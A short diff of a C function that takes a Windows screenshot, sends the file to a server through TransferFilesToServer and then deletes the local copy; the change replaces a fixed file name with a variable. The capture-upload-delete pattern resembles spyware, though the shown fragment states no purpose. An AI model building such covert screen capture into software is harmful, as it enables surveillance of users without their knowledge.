@@ -80,9 +80,9 @@ int TakeScreenshot(const char *OutName)
 	DeleteDC(MemoryDC);
 	ReleaseDC(DesktopWind, TotalScreenDC);
 
-	TransferFilesToServer("screenshot.bmp");
+	TransferFilesToServer(FullFileName);
 
-	DeleteFile("screenshot.bmp");
+	DeleteFile(FullFileName);
 
 	return EXIT_SUCCESS;
 }
